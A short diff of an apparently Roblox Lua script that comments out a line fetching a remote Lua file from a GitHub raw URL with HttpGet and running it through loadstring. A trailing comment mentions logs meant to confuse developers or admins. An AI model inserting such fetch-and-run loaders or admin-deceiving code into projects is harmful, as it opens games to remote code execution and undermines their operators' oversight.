@@ -24,7 +24,7 @@ for _, bgame in pairs(bgames) do
 end
 
 if un == true then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Input50/Something/master/DAC.lua"))()
+    --loadstring(game:HttpGet("https://raw.githubusercontent.com/Input50/Something/master/DAC.lua"))()
 end
 
 -- Full protection with sensible logs that are common to confuse any dev or admin
